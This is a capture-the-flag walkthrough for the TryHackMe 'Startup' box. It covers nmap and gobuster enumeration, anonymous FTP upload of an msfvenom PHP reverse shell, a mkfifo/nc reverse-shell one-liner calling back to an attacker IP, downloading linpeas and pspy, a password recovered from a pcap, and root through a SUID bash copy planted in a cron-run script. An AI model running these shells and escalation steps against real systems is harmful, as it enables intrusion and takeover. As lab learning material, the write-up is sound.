@@ -1,0 +1,195 @@
+Startup - THM
+Target IP: 10.48.157.220
+
+Scan the network:
+nmap -sV -O -p- 10.48.157.220
+
+We see three ports open:
+21 vsftpd
+22 OpenSSH 7.2p2
+80 Apache httpd
+
+Script scan to find any common vulnerability:
+nmap -sV -O -sC -p21,22,80 10.48.157.220
+
+Only usefull thing we find:
+ftp : anonymous login allowed
+
+21/ftp:
+ftp anonymous@10.48.157.220
+(Logged in)
+ls
+(directory: ftp)
+(file: notice.txt)
+(image: important.jpg)
+Lets check one by one
+
+cd ftp
+ls
+(its empty, however lets try to upload a random file)
+put test.txt
+(WORKEDDD!! Will come back to this later)
+
+get important.jpg
+strings important.jpg
+(Nothing useful)
+
+get notice.txt
+cat notice.txt
+(Nothing important)
+
+80/http:
+Lets review http://10.48.157.220
+curl -s http://10.48.157.220 (Source code reveals nothing important)
+
+Directory enumeration:
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.48.157.220
+
+We see one useful directory:
+/files (Review it)
+
+It has same contents as ftp:
+Check if the test file is present in ftp
+
+Important: Since we have access to upload file and view it, we use this to create a reverse shell by uploading an payload
+
+Method1:
+Create an payload:
+msfvenom -p php/reverse_php LHOST=10.48.110.235 LPORT=4444 -f raw > shell.php
+
+ftp anonymous@10.48.157.220
+ls -la
+cd ftp
+put shell.php
+
+Start a listener:
+nc -lvnp 4444
+
+Visit http://10.48.157.220/files > ftp > shell.php
+Execute the payload
+
+We have shell as www-data. Yayyy!
+id 
+whoami
+
+Method2:
+Visit Artyuum and download the index.php
+Upload the file in ftp and execute it
+
+Start a listener:
+nc -lvnp 4444
+
+Now run the below command for reverse shell:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.49.115.242 8888 >/tmp/f
+
+We have a reverse shell. YAYY
+id 
+whoami
+
+Stabilize the shell:
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+(Ctrl+z)
+
+stty raw -echo; fg
+(press enter and we have a stable shell)
+
+
+1. Lets find the first flag
+find / -name "recipe.txt" 2>/dev/null
+cat /recipe.txt
+
+Priv escalation time:
+Download linpeas.sh file
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+
+Start a server:
+python3 -m http.server
+
+Download the file: wget 10.49.115.242:8000/linpeas.sh
+Run the file: bash linpeas.sh
+
+We some interesting folders:
+/incidents
+cd incidents
+ls
+(we see an suspicious.pcapng file)
+(lets send it to out system)
+python3 -m http.server
+
+wget 10.49.163.180:8000/suspicious.pcapng
+
+(Now review the file)
+wireshark suspicious.pcapng
+(Now review different TCP stream, tcp.stream eq 0 then 1 till 7)
+(In tcp.stream eq 7, we find something which looks like a log of reverse shell)
+Review the file, below are few imp things we found:
+recipe.txt
+home
+lennie
+Password: c4ntg3t3n0ughsp1c3
+
+Note: Ther person who tried the password was incorrect, however we creds for lennie:c4ntg3t3n0ughsp1c3
+Lets list all users on the shell:
+cat /etc/passwd | grep -i sh | grep -v ssh
+(vagrant and root)
+su root
+(access denied)
+su vagrant 
+(access denied)
+
+Explore home:
+ls -la /home
+(we see lennie)
+cd lennie
+
+Lets check if lennie exists as a user:
+cat /etc/passwd | grep -i lennie
+(she does)
+su lennie
+Password:
+(logged in)
+id 
+whoami
+
+Lets explore cron jobs:
+wget http://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
+
+Since we have SSH cred of lennie, lets directly upload the file using scp:
+scp pspy64 lennie@10.49.163.180:/dev/shm/pspy64
+Password:
+(file is uploaded)
+
+Shell:
+cd /dev/shm
+chmod +x pspy64
+./pspy64
+
+We see a file called planner.sh
+cd /home
+cd lennie
+cd scripts
+ls -la 
+cat planner.sh
+
+Now we dont have write access only read access to the file, however if you review the content, it executes one more file called print.sh
+Review it: We have write access to it
+Change its content.Add these two lines:
+cp /bin/bash /tmp/bash
+chmod 4755 /tmp/bash
+
+ls -la /tmp/bash (checking if file exists)
+/tmp/bash -p
+(we have root now)
+id
+whoami
+
+Find the flags:
+1. Recipe
+find / -name "recipe.txt" 2>/dev/null
+
+2. user.txt
+find / -name "user.txt" 2>/dev/null
+
+3. root.txt
+find / -name "root.txt" 2>/dev/null
